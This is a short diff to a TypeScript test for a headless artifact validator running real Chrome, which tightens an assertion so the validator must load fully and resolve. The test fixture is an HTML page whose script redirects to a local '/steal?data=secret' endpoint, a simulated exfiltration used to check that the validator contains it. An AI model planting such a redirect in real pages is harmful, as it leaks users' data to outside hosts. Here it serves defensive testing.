@@ -73,7 +73,9 @@ describe.runIf(live)('headless artifact validator (live, real Chrome)', () => {
     const url = `http://127.0.0.1:${(sentinel.address() as AddressInfo).port}/steal?data=secret`;
     const html = `<!doctype html><html><body><script>window.location = ${JSON.stringify(url)};</script></body></html>`;
     try {
-      await validator({ html });
+      // Assert the validator's OUTCOME, not only the side-effect: it must load to completion and resolve
+      // (a launch/load crash would fail here rather than pass on an incidental hits===0). [LAW:verifiable-goals]
+      await expect(validator({ html })).resolves.toBeUndefined();
     } finally {
       sentinel.close();
     }
